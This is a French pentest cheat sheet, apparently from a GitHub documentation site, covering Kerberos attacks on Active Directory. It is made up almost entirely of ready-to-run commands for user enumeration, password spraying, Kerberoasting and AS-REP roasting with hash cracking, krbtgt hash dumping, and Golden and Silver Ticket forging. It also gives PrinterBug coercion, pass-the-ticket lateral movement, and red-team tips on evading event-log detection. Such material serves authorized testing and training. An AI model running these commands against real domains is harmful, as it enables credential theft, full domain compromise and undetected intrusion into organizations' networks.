# Kerberos Enumeration

Kerberos est le protocole d'authentification principal des environnements Active Directory. Il opère sur le port 88 et gère l'émission de tickets permettant aux utilisateurs de s'authentifier aux services du domaine. En pentest, Kerberos est une cible centrale pour l'énumération d'utilisateurs, le Kerberoasting, l'AS-REP Roasting et la forge de tickets.

## Objectifs

- Identifier le contrôleur de domaine et le service Kerberos
- Enumérer les utilisateurs valides du domaine
- Identifier les comptes avec SPN (Kerberoasting)
- Identifier les comptes sans pré-authentification (AS-REP Roasting)
- Tester les credentials via Kerberos
- Identifier les délégations mal configurées

## Ports

| Port | Service | Description |
|---|---|---|
| 88 | Kerberos | Authentification principale |
| 464 | Kerberos Password | Changement de mot de passe |
| 749 | Kerberos Admin | Administration Kerberos |

## Quick Enumeration

::: code-group
```bash [Kerbrute — users]
kerbrute userenum -d domain.com --dc <DC> users.txt
```
```bash [Impacket — GetNPUsers]
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC>
```
```bash [Impacket — GetUserSPNs]
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC>
```
```bash [NetExec]
nxc ldap <DC> -u user -p password --kerberoasting output.txt
nxc ldap <DC> -u user -p password --asreproast output.txt
```

:::

## Workflow Pentest
```
1. Scan du port 88
2. Identification du contrôleur de domaine
3. Enumération des utilisateurs valides (Kerbrute)
4. Test de pré-authentification (AS-REP Roasting)
5. Enumération des SPNs (Kerberoasting)
6. Identification des délégations non contraintes
7. Bruteforce / Password spraying via Kerberos
8. Exploitation des tickets obtenus
```

## Nmap

### Scan basique
```bash
nmap -p88 <target>
```

### Détection version
```bash
nmap -p88 -sV <target>
```

### Scripts NSE
```bash
# Enum Kerberos
nmap -p88 --script krb5-enum-users <target>
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=domain.com <target>

# Avec liste d'utilisateurs
nmap -p88 --script krb5-enum-users \
  --script-args krb5-enum-users.realm=domain.com,userdb=users.txt <target>
```

## Enumeration

### Identifier le contrôleur de domaine
```bash
# Via DNS
nslookup -type=SRV _kerberos._tcp.domain.com
dig SRV _kerberos._tcp.domain.com
dig SRV _ldap._tcp.dc._msdcs.domain.com

# Via NetExec
nxc smb 192.168.1.0/24 --gen-relay-list hosts.txt
nxc smb <DC> -u '' -p ''

# Via nltest (Windows)
nltest /dclist:domain.com
nltest /dsgetdc:domain.com
```

### Enumération d'utilisateurs — Kerbrute
```bash
# Enumérer les utilisateurs valides sans credentials
kerbrute userenum -d domain.com --dc <DC> \
  /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

# Avec liste personnalisée
kerbrute userenum -d domain.com --dc <DC> users.txt

# Output vers fichier
kerbrute userenum -d domain.com --dc <DC> users.txt -o valid_users.txt

# Verbose
kerbrute userenum -d domain.com --dc <DC> users.txt -v
```

### Enumération via Nmap
```bash
nmap -p88 --script krb5-enum-users \
  --script-args krb5-enum-users.realm=domain.com,userdb=users.txt <DC>
```

### Enumération via Metasploit
```bash
use auxiliary/gather/kerberos_enumusers
set RHOSTS <DC>
set DOMAIN domain.com
set USER_FILE users.txt
run
```

### Enumération des SPNs
```bash
# Sans credentials — liste les SPNs publics
impacket-GetUserSPNs domain.com/ -dc-ip <DC>

# Avec credentials
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC>

# Via NetExec
nxc ldap <DC> -u user -p password --kerberoasting output.txt

# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Via PowerView (Windows)
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
```

### Enumération des comptes sans pré-auth
```bash
# Via Impacket
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC>

# Avec credentials
impacket-GetNPUsers domain.com/user:password -dc-ip <DC> -request

# Via NetExec
nxc ldap <DC> -u user -p password --asreproast output.txt

# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Via PowerView (Windows)
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName
```

### Enumération des délégations
```bash
# Délégation non contrainte
nxc ldap <DC> -u user -p password --trusted-for-delegation

# Via LDAP — délégation non contrainte
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName

# Via LDAP — délégation contrainte
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# Via PowerView (Windows)
Get-DomainComputer -Unconstrained
Get-DomainUser -AllowDelegation
```

## Credentials Attacks

### Password spraying via Kerbrute
```bash
# Password spraying — plus discret que SMB
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123!

# Avec délai
kerbrute passwordspray -d domain.com --dc <DC> users.txt Password123! --delay 1000

# Bruteforce un compte
kerbrute bruteuser -d domain.com --dc <DC> passwords.txt targetuser
```

### Bruteforce via Impacket
```bash
# getTGT — test credentials
impacket-getTGT domain.com/user:password -dc-ip <DC>

# Via kinit (si Kerberos configuré localement)
kinit user@DOMAIN.COM
```

## Tickets Kerberos

### Demander un TGT
```bash
# Via Impacket
impacket-getTGT domain.com/user:password -dc-ip <DC>

# Avec hash NTLM
impacket-getTGT domain.com/user -hashes :NTLMhash -dc-ip <DC>

# Export du ticket
export KRB5CCNAME=user.ccache
```

### Demander un TGS
```bash
# Via Impacket
impacket-getST domain.com/user:password -spn cifs/<target> -dc-ip <DC>

# Constrained delegation
impacket-getST domain.com/svcaccount:password \
  -spn cifs/<target> -impersonate Administrator -dc-ip <DC>
```

### Lister et importer les tickets
```bash
# Lister les tickets
klist

# Importer un ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Utiliser le ticket
impacket-psexec domain.com/user@<target> -k -no-pass
impacket-wmiexec domain.com/user@<target> -k -no-pass
impacket-smbclient domain.com/user@<target> -k -no-pass
```

### Kerberoasting
```bash
# Impacket
impacket-GetUserSPNs domain.com/user:password -dc-ip <DC> \
  -request -outputfile kerberoast.txt

# NetExec
nxc ldap <DC> -u user -p password --kerberoasting kerberoast.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt /format:hashcat

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting
```bash
# Impacket — sans compte
impacket-GetNPUsers domain.com/ -usersfile users.txt \
  -no-pass -dc-ip <DC> -outputfile asrep.txt

# Impacket — avec compte
impacket-GetNPUsers domain.com/user:password \
  -dc-ip <DC> -request -outputfile asrep.txt

# NetExec
nxc ldap <DC> -u user -p password --asreproast asrep.txt

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Exploitation Avancée

### Pass-the-Ticket
```bash
# Importer un ticket volé
export KRB5CCNAME=/path/to/ticket.ccache

# Utiliser le ticket
impacket-psexec domain.com/user@<target> -k -no-pass
nxc smb <target> -u user -p '' --use-kcache
```

### Overpass-the-Hash
```bash
# Obtenir un TGT avec un hash NTLM
impacket-getTGT domain.com/user -hashes :NTLMhash -dc-ip <DC>
export KRB5CCNAME=user.ccache

# Utiliser le TGT
impacket-psexec domain.com/user@<target> -k -no-pass
```

### Golden Ticket
```bash
# Récupérer le hash krbtgt
impacket-secretsdump domain.com/user:password@<DC> -just-dc-user krbtgt

# Créer le Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  Administrator

# Utiliser le Golden Ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.com/Administrator@<DC> -k -no-pass
```

### Silver Ticket
```bash
# Créer un Silver Ticket
impacket-ticketer -nthash <SERVICE_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  -spn cifs/<target> \
  user

# Utiliser le Silver Ticket
export KRB5CCNAME=user.ccache
impacket-smbclient domain.com/user@<target> -k -no-pass
```

### Délégation non contrainte
```bash
# Identifier les machines avec délégation non contrainte
nxc ldap <DC> -u user -p password --trusted-for-delegation

# Forcer une connexion depuis un DC (PrinterBug / SpoolSample)
impacket-printerbug domain.com/user:password@<DC> <machine_with_delegation>

# Capturer le TGT avec Rubeus (Windows — sur la machine avec délégation)
Rubeus.exe monitor /interval:5 /nowrap

# Injecter le ticket
Rubeus.exe ptt /ticket:<base64_ticket>
```

## Configuration Kerberos locale

Pour utiliser les outils Impacket avec Kerberos :
```bash
# /etc/krb5.conf
cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = DOMAIN.COM
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    DOMAIN.COM = {
        kdc = <DC_IP>
        admin_server = <DC_IP>
    }

[domain_realm]
    .domain.com = DOMAIN.COM
    domain.com = DOMAIN.COM
EOF

# Synchroniser l'heure (Kerberos est sensible au décalage)
ntpdate <DC_IP>
sudo timedatectl set-ntp false
sudo date -s "$(date -d @$(sudo ntpdate -q <DC_IP> | awk '{print $1, $2}' | head -1 | awk '{print $1}'))"
```

## Points d'attaque

- Utilisateurs valides énumérables sans credentials (Kerbrute)
- Comptes sans pré-authentification Kerberos (AS-REP Roasting)
- Comptes de service avec SPN et mots de passe faibles (Kerberoasting)
- Délégations non contraintes mal configurées
- Hash krbtgt compromis — Golden Ticket
- Hashes de service compromis — Silver Ticket
- Décalage horaire NTP non vérifié — replay attacks
- RC4 encore autorisé — facilite le crack des tickets

::: info Tips Red Team

- Kerbrute est plus discret que les énumérations SMB/LDAP car il utilise directement le protocole Kerberos
- L'AS-REP Roasting ne nécessite aucun compte — utiliser une liste d'utilisateurs collectée via OSINT
- Le Kerberoasting génère un Event ID 4769 — cibler un seul compte à la fois pour rester discret
- Synchroniser l'heure avec le DC est critique — un décalage de plus de 5 minutes bloque l'authentification Kerberos
- Un Golden Ticket est valide 10 ans par défaut — même après un reset de mot de passe administrateur
- Le Silver Ticket est plus discret que le Golden Ticket car il ne contacte pas le KDC
- Combiner BloodHound avec les résultats Kerbrute pour prioriser les comptes à attaquer

:::

## Tools

- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Hashcat](https://hashcat.net/hashcat/)

## Ressources

- [HackTricks — Kerberos](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication)
- [The Hacker Recipes — Kerberos](https://www.thehacker.recipes/ad/movement/kerberos)
- [PayloadsAllTheThings — Kerberos](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)

## Notes
```
# Notes terrain
```

::: details Checklist

- Port 88 ouvert identifié
- Contrôleur de domaine identifié
- Utilisateurs valides énumérés (Kerbrute)
- Comptes sans pré-auth identifiés (AS-REP Roasting)
- SPNs énumérés (Kerberoasting)
- Délégations non contraintes vérifiées
- Password spraying effectué
- Tickets demandés et exportés
- Hashes crackés
- Tickets utilisés pour mouvement latéral

:::

<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/enumeration/kerberos.md)</span>

</div>